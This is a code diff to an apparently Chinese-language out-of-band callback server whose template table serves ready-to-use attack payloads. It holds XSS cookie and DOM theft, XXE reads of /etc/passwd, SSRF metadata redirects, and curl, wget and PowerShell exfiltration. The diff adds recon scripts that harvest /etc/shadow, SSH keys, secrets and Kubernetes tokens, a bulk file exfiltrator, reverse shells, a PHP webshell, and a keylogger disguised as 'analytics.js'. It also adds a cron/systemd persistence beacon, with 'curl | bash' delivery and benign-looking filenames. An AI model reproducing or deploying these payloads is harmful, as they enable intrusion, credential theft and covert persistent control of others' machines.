@@ -2,7 +2,7 @@
 from fastapi import APIRouter, Request, Depends, HTTPException
 from fastapi.responses import PlainTextResponse, Response
 from sqlalchemy.ext.asyncio import AsyncSession
-from sqlalchemy import select, delete, func, update
+from sqlalchemy import select, delete, func
 from pydantic import BaseModel
 from typing import Optional, List, Dict
 from datetime import datetime, timedelta
@@ -492,6 +492,7 @@ class PocRuleCreate(BaseModel):
     redirect_url: Optional[str] = None
     delay_ms: int = 0
     enable_variables: bool = False
+    filename: Optional[str] = None
 
 
 class PocRuleUpdate(BaseModel):
@@ -505,6 +506,7 @@ class PocRuleUpdate(BaseModel):
     delay_ms: Optional[int] = None
     enable_variables: Optional[bool] = None
     is_active: Optional[bool] = None
+    filename: Optional[str] = None
 
 
 class PocRuleResponse(BaseModel):
@@ -522,6 +524,7 @@ class PocRuleResponse(BaseModel):
     is_active: bool
     hit_count: int
     url: str
+    filename: Optional[str] = None
     created_at: datetime
 
     class Config:
@@ -533,16 +536,24 @@ class PocRuleResponse(BaseModel):
 # - _exfil=1 标记这是一个数据外带请求
 # - _type=xxx 外带数据类型 (cookie/file/cmd/custom)
 # - _data=xxx 或其他参数名 实际外带的数据
+#
+# 模板字段说明:
+# - category: 模板分类 (xss/xxe/ssrf/rce/shell/script)
+# - filename: 建议的文件名，设置后响应带 Content-Disposition
+# - usage: 建议的使用方式（前端展示）
 POC_TEMPLATES = {
+    # ==================== XSS ====================
     "xss_basic": {
         "name": "xss-alert",
         "description": "基础 XSS 弹窗测试（仅验证执行）",
+        "category": "xss",
         "content_type": "text/html",
         "response_body": "<script>alert(document.domain)</script>",
     },
     "xss_cookie": {
         "name": "xss-cookie",
         "description": "XSS Cookie 外带（验证+数据回传）",
+        "category": "xss",
         "content_type": "text/html",
         "response_body": "<script>new Image().src='{{callback_url}}?_exfil=1&_type=cookie&_data='+encodeURIComponent(document.cookie)+'&domain='+document.domain</script>",
         "enable_variables": True,
@@ -550,13 +561,16 @@ POC_TEMPLATES = {
     "xss_dom": {
         "name": "xss-dom",
         "description": "XSS DOM 信息外带",
+        "category": "xss",
         "content_type": "text/html",
         "response_body": "<script>fetch('{{callback_url}}?_exfil=1&_type=dom&_data='+encodeURIComponent(JSON.stringify({url:location.href,cookie:document.cookie,localStorage:Object.keys(localStorage)})))</script>",
         "enable_variables": True,
     },
+    # ==================== XXE ====================
     "xxe_dtd": {
         "name": "xxe-dtd",
         "description": "XXE 外带 DTD（文件内容回传）",
+        "category": "xxe",
         "content_type": "application/xml-dtd",
         "response_body": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM '{{callback_url}}?_exfil=1&_type=file&_data=%data;'>\">\n%param1;",
         "enable_variables": True,
@@ -564,31 +578,38 @@ POC_TEMPLATES = {
     "xxe_file": {
         "name": "xxe-file",
         "description": "XXE 文件读取（内联）",
+        "category": "xxe",
         "content_type": "application/xml",
         "response_body": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>",
     },
+    # ==================== SSRF ====================
     "ssrf_aws": {
         "name": "ssrf-aws",
         "description": "SSRF AWS Metadata 重定向",
+        "category": "ssrf",
         "redirect_url": "http://169.254.169.254/latest/meta-data/",
         "status_code": 302,
     },
     "ssrf_gcp": {
         "name": "ssrf-gcp",
         "description": "SSRF GCP Metadata 重定向",
+        "category": "ssrf",
         "redirect_url": "http://metadata.google.internal/computeMetadata/v1/",
         "status_code": 302,
     },
     "ssrf_exfil": {
         "name": "ssrf-exfil",
         "description": "SSRF 数据外带（curl）",
+        "category": "ssrf",
         "content_type": "text/plain",
         "response_body": "curl '{{callback_url}}?_exfil=1&_type=ssrf&_data='$(cat /etc/passwd | base64 -w0)",
         "enable_variables": True,
     },
+    # ==================== RCE ====================
     "rce_curl": {
         "name": "rce-curl",
         "description": "RCE 命令结果外带（curl）",
+        "category": "rce",
         "content_type": "text/plain",
         "response_body": "curl '{{callback_url}}?_exfil=1&_type=cmd&_data='$(id | base64 -w0)",
         "enable_variables": True,
@@ -596,6 +617,7 @@ POC_TEMPLATES = {
     "rce_wget": {
         "name": "rce-wget",
         "description": "RCE 命令结果外带（wget）",
+        "category": "rce",
         "content_type": "text/plain",
         "response_body": "wget -q -O- '{{callback_url}}?_exfil=1&_type=cmd&_data='$(whoami)",
         "enable_variables": True,
@@ -603,6 +625,7 @@ POC_TEMPLATES = {
     "rce_powershell": {
         "name": "rce-ps",
         "description": "RCE PowerShell 外带",
+        "category": "rce",
         "content_type": "text/plain",
         "response_body": "powershell -c \"IWR '{{callback_url}}?_exfil=1&_type=cmd&_data='+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))\"",
         "enable_variables": True,
@@ -610,13 +633,16 @@ POC_TEMPLATES = {
     "ssti_jinja": {
         "name": "ssti-jinja",
         "description": "SSTI Jinja2 RCE 外带",
+        "category": "rce",
         "content_type": "text/plain",
         "response_body": "{{config.__class__.__init__.__globals__['os'].popen('curl \"{{callback_url}}?_exfil=1&_type=ssti&_data=\"$(id)').read()}}",
         "enable_variables": True,
     },
+    # ==================== 反弹 Shell ====================
     "shell_bash": {
         "name": "shell-bash",
         "description": "Bash 反弹 Shell",
+        "category": "shell",
         "content_type": "text/plain",
         "response_body": "bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1",
         "enable_variables": True,
@@ -624,8 +650,202 @@ POC_TEMPLATES = {
     "shell_python": {
         "name": "shell-python",
         "description": "Python 反弹 Shell",
+        "category": "shell",
         "content_type": "text/plain",
         "response_body": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{attacker_ip}}\",{{attacker_port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "enable_variables": True,
+    },
+    # ==================== 脚本文件 ====================
+    "script_bash_recon": {
+        "name": "recon-linux",
+        "description": "Linux 系统信息收集脚本（curl | bash）",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "setup.sh",
+        "usage": "curl -sL {url} | bash",
+        "response_body": """#!/bin/bash
+CB="{{callback_url}}"
+c(){ echo "=== $1 ==="; eval "$2" 2>/dev/null; echo; }
+{
+  c "System" "uname -a; cat /etc/os-release"
+  c "User" "whoami; id; w"
+  c "Network" "ip a || ifconfig; ss -tlnp || netstat -tlnp"
+  c "DNS" "cat /etc/resolv.conf; cat /etc/hosts"
+  c "Passwd" "cat /etc/passwd"
+  c "Shadow" "cat /etc/shadow"
+  c "SSH Keys" "ls -la ~/.ssh/; cat ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa"
+  c "Cron" "crontab -l; ls -la /etc/cron*"
+  c "SUID" "find / -perm -4000 -type f 2>/dev/null | head -20"
+  c "Process" "ps aux | head -40"
+  c "Env" "env"
+  c "History" "cat ~/.bash_history | tail -50"
+  c "Docker" "docker ps; cat /proc/1/cgroup"
+  c "K8s" "cat /var/run/secrets/kubernetes.io/serviceaccount/token; env | grep -i kube"
+} | curl -s -X POST "$CB?_exfil=1&_type=recon" -d @-""",
+        "enable_variables": True,
+    },
+    "script_py_recon": {
+        "name": "recon-python",
+        "description": "跨平台 Python 信息收集脚本",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "check.py",
+        "usage": "curl -sL {url} | python3",
+        "response_body": """#!/usr/bin/env python3
+import os,sys,socket,platform,json,urllib.request,subprocess as sp
+CB="{{callback_url}}"
+def run(cmd):
+    try: return sp.check_output(cmd,shell=True,stderr=sp.DEVNULL,timeout=10).decode(errors='replace')
+    except: return ""
+info={}
+info["hostname"]=socket.gethostname()
+info["platform"]=platform.platform()
+info["arch"]=platform.machine()
+info["user"]=os.getenv("USER") or os.getenv("USERNAME") or run("whoami").strip()
+info["uid"]=run("id").strip()
+info["cwd"]=os.getcwd()
+info["pid"]=os.getpid()
+info["python"]=sys.version
+info["ip_internal"]=socket.gethostbyname(socket.gethostname())
+info["env"]={k:v for k,v in os.environ.items() if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AWS","DB","API"])}
+info["ifconfig"]=run("ip a 2>/dev/null || ifconfig 2>/dev/null")
+info["passwd"]=run("cat /etc/passwd 2>/dev/null")
+info["ps"]=run("ps aux 2>/dev/null | head -30")
+info["home_files"]=run("ls -la ~ 2>/dev/null")
+info["ssh_keys"]=run("ls -la ~/.ssh/ 2>/dev/null")
+data=json.dumps(info,ensure_ascii=False,indent=2).encode()
+req=urllib.request.Request(CB+"?_exfil=1&_type=recon",data=data,method="POST")
+req.add_header("Content-Type","application/json")
+try: urllib.request.urlopen(req,timeout=15)
+except: pass""",
+        "enable_variables": True,
+    },
+    "script_ps_recon": {
+        "name": "recon-windows",
+        "description": "Windows PowerShell 信息收集脚本",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "update.ps1",
+        "usage": "powershell -ep bypass -c \"IEX(IWR '{url}')\"",
+        "response_body": """$CB="{{callback_url}}"
+$info=@{}
+$info["hostname"]=$env:COMPUTERNAME
+$info["user"]="$env:USERDOMAIN\\$env:USERNAME"
+$info["os"]=(Get-CimInstance Win32_OperatingSystem).Caption
+$info["arch"]=$env:PROCESSOR_ARCHITECTURE
+$info["ip"]=(Get-NetIPAddress -AddressFamily IPv4 | Where {$_.IPAddress -ne "127.0.0.1"}).IPAddress -join ","
+$info["domain"]=(Get-CimInstance Win32_ComputerSystem).Domain
+$info["av"]=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0).displayName -join ","
+$info["ps"]=(Get-Process | Select -First 30 Name,Id,Path | ConvertTo-Json -Compress)
+$info["services"]=(Get-Service | Where Status -eq Running | Select -First 20 Name | ConvertTo-Json -Compress)
+$info["env"]=($env:Path)
+$info["admins"]=(net localgroup administrators 2>$null) -join "`n"
+$info["netstat"]=(netstat -an | Select -First 30) -join "`n"
+$info["arp"]=(arp -a) -join "`n"
+$info["installed"]=((Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).DisplayName | Select -First 20) -join ","
+$json=[System.Text.Encoding]::UTF8.GetBytes(($info|ConvertTo-Json -Compress))
+try{IWR -Uri "$CB`?_exfil=1&_type=recon" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15}catch{}""",
+        "enable_variables": True,
+    },
+    "script_bash_exfil": {
+        "name": "exfil-files",
+        "description": "批量文件外带脚本（支持指定目录）",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "check.sh",
+        "usage": "curl -sL {url} | bash",
+        "response_body": """#!/bin/bash
+CB="{{callback_url}}"
+TARGETS="/etc/passwd /etc/shadow /etc/hosts /etc/crontab"
+TARGETS="$TARGETS $(find /home -name '.bash_history' -o -name '.env' -o -name 'id_rsa' -o -name '*.conf' 2>/dev/null | head -20)"
+TARGETS="$TARGETS $(find /var/www -name '*.php' -o -name '*.env' -o -name 'config*' 2>/dev/null | head -20)"
+TARGETS="$TARGETS $(find /opt /srv -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '.env' 2>/dev/null | head -20)"
+for f in $TARGETS; do
+  [ -r "$f" ] && {
+    data=$(base64 -w0 "$f" 2>/dev/null || base64 "$f" 2>/dev/null)
+    curl -s "$CB?_exfil=1&_type=file&filename=$(echo $f|base64 -w0)&_data=$data" -o /dev/null
+    sleep 0.2
+  }
+done""",
+        "enable_variables": True,
+    },
+    "script_py_revshell": {
+        "name": "revshell-python",
+        "description": "Python 反弹 Shell 脚本（带 PTY）",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "svc.py",
+        "usage": "curl -sL {url} | python3",
+        "response_body": """#!/usr/bin/env python3
+import socket,subprocess,os,pty,sys
+HOST="{{attacker_ip}}"
+PORT={{attacker_port}}
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((HOST,int(PORT)))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/bash")
+except:
+    sys.exit(0)""",
+        "enable_variables": True,
+    },
+    "script_php_webshell": {
+        "name": "webshell-php",
+        "description": "PHP 一句话 Webshell（密码保护）",
+        "category": "script",
+        "content_type": "application/x-httpd-php",
+        "filename": "config.php",
+        "response_body": "<?php if(md5($_GET['k'])!=='{{param.keyhash}}'){die('404');}@eval($_POST['cmd']);?>\n<?php /* Usage: ?k=yourkey POST cmd=phpinfo(); */ ?>",
+        "enable_variables": True,
+    },
+    "script_js_keylogger": {
+        "name": "keylogger-js",
+        "description": "JavaScript 键盘记录器脚本",
+        "category": "script",
+        "content_type": "text/javascript",
+        "filename": "analytics.js",
+        "usage": "<script src=\"{url}\"></script>",
+        "response_body": """(function(){var b="",u="{{callback_url}}";document.addEventListener("keypress",function(e){b+=e.key;if(b.length>=20){new Image().src=u+"?_exfil=1&_type=keylog&_data="+encodeURIComponent(b)+"&page="+encodeURIComponent(location.href);b=""}});document.addEventListener("submit",function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v});new Image().src=u+"?_exfil=1&_type=form&_data="+encodeURIComponent(JSON.stringify(d))})})();""",
+        "enable_variables": True,
+    },
+    "script_bash_persist": {
+        "name": "persist-cron",
+        "description": "Linux Cron 持久化脚本",
+        "category": "script",
+        "content_type": "text/plain",
+        "filename": "install.sh",
+        "usage": "curl -sL {url} | bash",
+        "response_body": """#!/bin/bash
+CB="{{callback_url}}"
+PAYLOAD="curl -s $CB?_exfil=1&_type=beacon&_data=$(hostname)-$(whoami) > /dev/null 2>&1"
+# cron 持久化
+(crontab -l 2>/dev/null; echo "*/5 * * * * $PAYLOAD") | sort -u | crontab - 2>/dev/null
+# bashrc 持久化
+grep -q "$CB" ~/.bashrc 2>/dev/null || echo "$PAYLOAD" >> ~/.bashrc 2>/dev/null
+# systemd timer（需要 root）
+if [ "$(id -u)" -eq 0 ]; then
+cat > /etc/systemd/system/syscheck.service << 'SVC'
+[Unit]
+Description=System Check
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "PAYLOAD_CMD"
+SVC
+sed -i "s|PAYLOAD_CMD|$PAYLOAD|g" /etc/systemd/system/syscheck.service
+cat > /etc/systemd/system/syscheck.timer << 'TMR'
+[Unit]
+Description=System Check Timer
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=300
+[Install]
+WantedBy=timers.target
+TMR
+systemctl daemon-reload && systemctl enable --now syscheck.timer 2>/dev/null
+fi
+$PAYLOAD""",
         "enable_variables": True,
     },
 }
@@ -672,6 +892,7 @@ async def create_poc_rule(
         redirect_url=req.redirect_url,
         delay_ms=req.delay_ms,
         enable_variables=1 if req.enable_variables else 0,
+        filename=req.filename,
     )
     db.add(rule)
     await db.flush()
@@ -684,7 +905,8 @@ async def create_poc_rule(
         response_headers=rule.response_headers, redirect_url=rule.redirect_url,
         delay_ms=rule.delay_ms, enable_variables=bool(rule.enable_variables),
         is_active=bool(rule.is_active), hit_count=rule.hit_count,
-        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"), created_at=rule.created_at
+        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"),
+        filename=rule.filename, created_at=rule.created_at
     )
 
 
@@ -715,7 +937,8 @@ async def list_poc_rules(
         response_body=r.response_body, response_headers=r.response_headers,
         redirect_url=r.redirect_url, delay_ms=r.delay_ms,
         enable_variables=bool(r.enable_variables), is_active=bool(r.is_active),
-        hit_count=r.hit_count, url=get_callback_url(f"/c/{token.token}/p/{r.name}"), created_at=r.created_at
+        hit_count=r.hit_count, url=get_callback_url(f"/c/{token.token}/p/{r.name}"),
+        filename=r.filename, created_at=r.created_at
     ) for r in rules]
 
 
@@ -761,7 +984,8 @@ async def update_poc_rule(
         response_headers=rule.response_headers, redirect_url=rule.redirect_url,
         delay_ms=rule.delay_ms, enable_variables=bool(rule.enable_variables),
         is_active=bool(rule.is_active), hit_count=rule.hit_count,
-        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"), created_at=rule.created_at
+        url=get_callback_url(f"/c/{token.token}/p/{rule.name}"),
+        filename=rule.filename, created_at=rule.created_at
     )
 
 
@@ -825,6 +1049,13 @@ def replace_variables(content: str, request: Request, client_ip: str, token: str
     return content
 
 
+def _normalize_ip(ip: str) -> str:
+    """将 IPv4-mapped IPv6 (::ffff:x.x.x.x) 转为纯 IPv4"""
+    if ip and ip.startswith('::ffff:'):
+        return ip[7:]  # 去掉 '::ffff:'
+    return ip or ''
+
+
 def get_client_ip(request: Request) -> str:
     """
     从请求中获取真实客户端 IP
@@ -848,21 +1079,20 @@ def get_client_ip(request: Request) -> str:
     for header in proxy_headers:
         value = request.headers.get(header)
         if value:
-            # 某些情况下可能有多个 IP，取第一个
             ip = value.split(',')[0].strip()
             if ip:
-                return ip
+                return _normalize_ip(ip)
     
     # X-Forwarded-For 特殊处理（格式：client, proxy1, proxy2）
     forwarded = request.headers.get('X-Forwarded-For')
     if forwarded:
         ip = forwarded.split(',')[0].strip()
         if ip:
-            return ip
+            return _normalize_ip(ip)
     
     # 兜底：直接连接的 IP
     if request.client and request.client.host:
-        return request.client.host
+        return _normalize_ip(request.client.host)
     
     return 'unknown'
 
@@ -989,6 +1219,8 @@ async def handle_callback(request: Request, token: str, path: str, db: AsyncSess
             # 构建响应头
             response_headers = dict(rule.response_headers or {})
             response_headers["Content-Type"] = rule.content_type
+            if rule.filename:
+                response_headers["Content-Disposition"] = f'inline; filename="{rule.filename}"'
             
             return Response(
                 content=response_body,
